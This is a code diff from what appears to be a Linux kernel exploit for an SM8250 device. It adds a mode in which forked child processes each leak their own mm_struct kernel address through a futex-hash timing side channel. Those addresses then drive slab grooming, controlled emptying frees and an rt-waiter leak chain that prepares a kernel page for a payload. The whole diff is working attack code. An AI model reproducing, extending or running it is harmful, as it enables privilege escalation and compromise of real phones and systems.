@@ -7,6 +7,7 @@
 #include "kernel_page/identity.h"
 #include "kernel_page/branch.h"
 #include <dirent.h>
+#include <poll.h>
 
 /* The emptying free must run on a CPU whose c->page is not base, or
  * do_slab_free takes the fastpath and never reaches __slab_free. */
@@ -56,6 +57,14 @@ static struct mm_ctx pre_ctx;
 static struct mm_ctx post_ctx;
 static struct mm_ctx lead_ctx;
 static pid_t child_leak;
+/* KS_ID_DUMPS: slots 1..N each run their own leak after the burst is built.
+ * The recovered address belongs to that child's mm, which is the object in
+ * that slot, so this is the only route to a page per object.  Scans are
+ * serialized on the freeing CPU: one at a time, ~8-10 minutes each. */
+static int ks_id_dumps;
+static int dump_pipe_count;
+static int dump_fd[64][4]; /* start[0], start[1], report[0], report[1] */
+static uintptr_t dump_addr[64];
 static uintptr_t cached_leaked_mm;
 /* Set when a preparation attempt died in collision finding or the mm leak.
  * Retrying that path re-creates thousands of piled waiters and was observed to
@@ -1373,6 +1382,139 @@ pid_t clone_leak_child(void) {
  * neighbours that share its slab) must stay allocated until it reports a
  * verdict.  The child exits by itself afterwards; it is reaped by
  * reap_leak_child() so its mm object is freed at exactly that moment. */
+static double ks_now_ms(void);
+
+/* One dump slot's child: wait for its byte, scan its own mm, report the
+ * address, then park on the freeing CPU as a live slab object. */
+static pid_t clone_dump_slot(size_t slot) {
+  int i = (int)slot - 1;
+  if (i < 0 || i >= dump_pipe_count || dump_fd[i][0] < 0) {
+    return -1;
+  }
+  pid_t child = fork();
+  if (child < 0) {
+    pr_error("KS_ID_DUMP fork failed slot=%zu errno=%d\n", slot, errno);
+    return -1;
+  }
+  if (child == 0) {
+    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
+    if (getppid() == 1) {
+      _exit(0);
+    }
+    close_inherited_memfds();
+    for (int k = 0; k < dump_pipe_count; k++) {
+      if (k == i) {
+        continue;
+      }
+      for (int j = 0; j < 4; j++) {
+        if (dump_fd[k][j] >= 0) {
+          close(dump_fd[k][j]);
+        }
+      }
+    }
+    close(dump_fd[i][1]);
+    close(dump_fd[i][2]);
+    pin_to_core(CORE);
+    char go = 0;
+    if (read(dump_fd[i][0], &go, 1) != 1) {
+      _exit(0);
+    }
+    close(dump_fd[i][0]);
+    /* Own scan state: the shared `ks` of the parent would be corrupted by
+     * serial scans, and futex_hash() hashes current->mm, which is exactly
+     * the object this child owns. */
+    ks = kernelsnitch_setup(MM_STRUCT_SZ, MM_ORDER,
+                            (int)sysconf(_SC_NPROCESSORS_ONLN),
+                            KSNITCH_COLLISIONS, 1, 0);
+    ks->identity_end = (size_t)g_direct_map_end;
+    ks->ram_bytes = g_ram_bytes;
+    kernelsnitch_find_collisions(ks);
+    if (kernelsnitch_found_collisions(ks)) {
+      run_kernelsnitch_bruteforce();
+    }
+    uintptr_t mm = 0;
+    if (ks->state == KERNELSNITCH_MM_FOUND && ks->mm_struct != (size_t)-1 &&
+        mm_plausible(ks->mm_struct)) {
+      mm = (uintptr_t)ks->mm_struct;
+    }
+    {
+      char line[32];
+      int n = snprintf(line, sizeof(line), "%016zx\n", (size_t)mm);
+      if (n > 0) {
+        ssize_t w = write(dump_fd[i][3], line, (size_t)n);
+        (void)w;
+      }
+    }
+    close(dump_fd[i][3]);
+    pin_to_core(CORE);
+    for (;;) {
+      pause();
+    }
+  }
+  close(dump_fd[i][0]);
+  dump_fd[i][0] = -1;
+  close(dump_fd[i][3]);
+  dump_fd[i][3] = -1;
+  return child;
+}
+
+/* Signal slot i+1, wait for its address, and give it to the table.  A slot
+ * that does not answer inside the window stays unresolved; it is never
+ * filled with another slot's page. */
+static void collect_dump_addresses(struct kp_geometry *geo) {
+  double t0 = ks_now_ms();
+  for (int i = 0; i < dump_pipe_count; i++) {
+    char go = 1;
+    if (dump_fd[i][1] >= 0) {
+      ssize_t w = write(dump_fd[i][1], &go, 1);
+      (void)w;
+      close(dump_fd[i][1]);
+      dump_fd[i][1] = -1;
+    }
+    char line[64];
+    size_t used = 0;
+    int got = 0;
+    for (int waited = 0; waited < 900; waited++) {
+      struct pollfd p;
+      p.fd = dump_fd[i][2];
+      p.events = POLLIN;
+      p.revents = 0;
+      int pr = poll(&p, 1, 1000);
+      if (pr > 0 && (p.revents & (POLLIN | POLLHUP))) {
+        ssize_t n = read(dump_fd[i][2], line + used,
+                         sizeof(line) - 1 - used);
+        if (n > 0) {
+          used += (size_t)n;
+          if (memchr(line, '\n', used) != NULL) {
+            got = 1;
+            break;
+          }
+        } else if (n == 0) {
+          break;
+        }
+      } else if (pr < 0 && errno != EINTR) {
+        break;
+      }
+    }
+    close(dump_fd[i][2]);
+    dump_fd[i][2] = -1;
+    line[used] = 0;
+    uintptr_t mm = 0;
+    if (got) {
+      mm = (uintptr_t)strtoull(line, NULL, 16);
+    }
+    pr_info("KS_ID_DUMP slot=%d addr=%016zx src=%s waited_ms=%.0f\n", i + 1,
+            (size_t)mm, got ? "measured(scan-in-slot-child)" : "unavailable",
+            ks_now_ms() - t0);
+    if (mm != 0) {
+      dump_addr[i] = mm;
+      (void)kp_identity_object(geo, (size_t)i + 1, mm);
+    }
+  }
+  pr_info("KS_ID_DUMP_DONE slots=%d total_ms=%.0f\n", dump_pipe_count,
+          ks_now_ms() - t0);
+}
+
 static void wait_leak_child(pid_t child) {
   if (child <= 0) {
     return;
@@ -2255,6 +2397,20 @@ uintptr_t prepare_kernel_page(int payload_mode) {
    * SM8250 64-byte cache line -> 0x3c0 (see rt-waiter-placement-audit.md). */
   /* SLUB object stride (ALIGN(sizeof, cache line)), not the logical size. */
   mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
+  {
+    const char *d = getenv("KS_ID_DUMPS");
+    int want = (d && *d) ? atoi(d) : 0;
+    if (want < 0) {
+      want = 0;
+    }
+    if (want > (int)mm_objs_per_slab - 1) {
+      want = (int)mm_objs_per_slab - 1;
+    }
+    if (want > 64) {
+      want = 64;
+    }
+    ks_id_dumps = want;
+  }
   /* Slabinfo reports objsize/objperslab/pagesperslab, so the slab span
    * does not have to be assumed from ORDER3_SIZE.  The line also prints
    * whether those constants agree with the kernel's own numbers. */
@@ -2332,6 +2488,28 @@ uintptr_t prepare_kernel_page(int payload_mode) {
       size_t pre_n = 0;
       size_t cap = lead_ctx.mm_cnt;
       pin_to_core(CORE);
+      if (ks_id_dumps > 0) {
+        int made = 0;
+        for (int i = 0; i < ks_id_dumps; i++) {
+          int sp[2] = {-1, -1};
+          int rp[2] = {-1, -1};
+          if (pipe(sp) != 0 || pipe(rp) != 0) {
+            if (sp[0] >= 0) {
+              close(sp[0]);
+              close(sp[1]);
+            }
+            break;
+          }
+          dump_fd[i][0] = sp[0];
+          dump_fd[i][1] = sp[1];
+          dump_fd[i][2] = rp[0];
+          dump_fd[i][3] = rp[1];
+          made++;
+        }
+        dump_pipe_count = made;
+        ks_id_dumps = made;
+        pr_info("KS_ID_DUMPS slots=%d mode=serial-own-mm-scan\n", made);
+      }
       mm_slab_counts_full(&slot_a0, NULL, &slabs_prev);
       long burst_num_prev = -1;
       long burst_num_now = -1;
@@ -2380,22 +2558,29 @@ uintptr_t prepare_kernel_page(int payload_mode) {
        * on the CPU the crossing drains.  The slab's last live object is then a
        * plain child whose exit is the emptying free the control page has
        * already proven, instead of the scan child. */
-      child_leak = clone_leak_child();
-      if (child_leak > 0) {
-        pre_ctx.childs[pre_n] = child_leak;
-        pre_slots[pre_n] = -1; /* pins itself; the loop still checks its CPU */
-        pre_n++;
+      if (ks_id_dumps == 0) {
+        child_leak = clone_leak_child();
+        if (child_leak > 0) {
+          pre_ctx.childs[pre_n] = child_leak;
+          pre_slots[pre_n] = -1; /* pins itself; the loop still checks its CPU */
+          pre_n++;
+        }
       }
       while (pre_n < pre_ctx.mm_cnt) {
         /* Every filler must free on the CPU whose partial list the crossing
          * drains; the slab's last live object is the exception - its exit is
          * the emptying free, so it waits on the escaped CPU. */
-        pid_t c = clone_child_cpu(pre_n + 1 == pre_ctx.mm_cnt ? EMPTYING_CPU
-                                                              : CORE);
+        int dump_slot = (ks_id_dumps > 0 && pre_n >= 1 &&
+                         (int)pre_n <= ks_id_dumps);
+        pid_t c = dump_slot
+                      ? clone_dump_slot(pre_n)
+                      : clone_child_cpu(pre_n + 1 == pre_ctx.mm_cnt
+                                            ? EMPTYING_CPU
+                                            : CORE);
         if (c <= 0) break;
         (void)ks_buddy_capture();
         pre_ctx.childs[pre_n] = c;
-        pre_slots[pre_n] = pin_slot_of_last;
+        pre_slots[pre_n] = dump_slot ? -1 : pin_slot_of_last;
         pre_n++;
       }
       lead_ctx.mm_cnt = lead_n;
@@ -2508,8 +2693,20 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     /* Wait for the in-child scan before releasing anything: a partially
      * free slab on the SLUB partial list could be handed to any system
      * fork during the ~10 minute scan, and the leaked slot would be gone. */
-    wait_leak_child(child_leak);
-    leaked = ks->mm_struct;
+    if (ks_id_dumps > 0) {
+      /* Open the table before the addresses are recorded: kp_identity_object
+       * writes one row's worth of provenance per slot, and the window must
+       * already belong to this run. */
+      kp_identity_window(pre_ctx.mm_cnt);
+      collect_dump_addresses(&kp_geo);
+      leaked = dump_addr[0];
+      if (leaked == 0) {
+        pr_warning("KS_ID_DUMPS no-address slot=1\n");
+      }
+    } else {
+      wait_leak_child(child_leak);
+      leaked = ks->mm_struct;
+    }
     pr_info("KS_TIME leak_ms=%.0f\n", ks_now_ms() - ks_t0);
 
     /* /proc/<pid>/mem holds an mm reference: if it outlives the task the
@@ -2625,17 +2822,24 @@ uintptr_t prepare_kernel_page(int payload_mode) {
      * agreement of this run's collisions before trusting the scan result,
      * otherwise the punch runs against a wild lock and dies in
      * _raw_spin_trylock - a reboot that yields no information. */
-    int mm_verified = ks_pc_answer_matches_collisions(leaked);
+    /* In dump mode the scan ran inside the slot's own child, so the collision
+     * set that verified the address lives there, not in this process.  The
+     * child accepted the address only if its own bruteforce matched the
+     * collisions and mm_plausible() held; the parent can only require that it
+     * reported one.  The single-scan mode keeps the stricter local re-check. */
+    int mm_verified = ks_id_dumps > 0
+                          ? (dump_addr[0] != 0 ? 1 : 0)
+                          : ks_pc_answer_matches_collisions(leaked);
     /* The strength of the leak is the cross-validated collision set, not the
      * pile counts: candidate1/2_count are the futexes that timed slow under
      * each pile (116-140 is normal and includes unrelated noise), while
      * accepted_count is the intersection of two independent piles, which is
      * what the mm candidate is tested against.  Fewer than 8 accepted
      * collisions cannot distinguish an mm from a coincidence, so refuse. */
-    size_t accepted = ks->accepted_count;
-    int weak = (accepted < 8);
-    if (ks->state != KERNELSNITCH_MM_FOUND || leaked == (uintptr_t)-1 ||
-        mm_verified == 0 || weak) {
+    size_t accepted = ks_id_dumps > 0 ? 0 : ks->accepted_count;
+    int weak = ks_id_dumps > 0 ? 0 : (accepted < 8);
+    if ((ks_id_dumps == 0 && ks->state != KERNELSNITCH_MM_FOUND) ||
+        leaked == (uintptr_t)-1 || leaked == 0 || mm_verified == 0 || weak) {
       pr_warning("KernelSnitch mm_struct leak failed state=%d mm=%016zx "
                  "verified=%d accepted=%zu pile1=%zu pile2=%zu\n",
                  (int)ks->state, leaked, mm_verified, accepted,
@@ -2671,7 +2875,9 @@ uintptr_t prepare_kernel_page(int payload_mode) {
    * (KS_PRE leak_slot=1), so a correct resolution lands on slot 1. */
   /* Open the identity table: every row carries this window id, and every
    * derived page address keeps the address and geometry it came from. */
-  kp_identity_window(pre_ctx.mm_cnt);
+  if (ks_id_dumps == 0) {
+    kp_identity_window(pre_ctx.mm_cnt);
+  }
   (void)kp_identity_anchor(&kp_geo, leaked, 1, &kp_anchor);
   /* Point the chain-walk owner at the mm_struct so the
    * "waiter->prio = task->prio" copy leaks *(int *)mm_va into the SKB. */
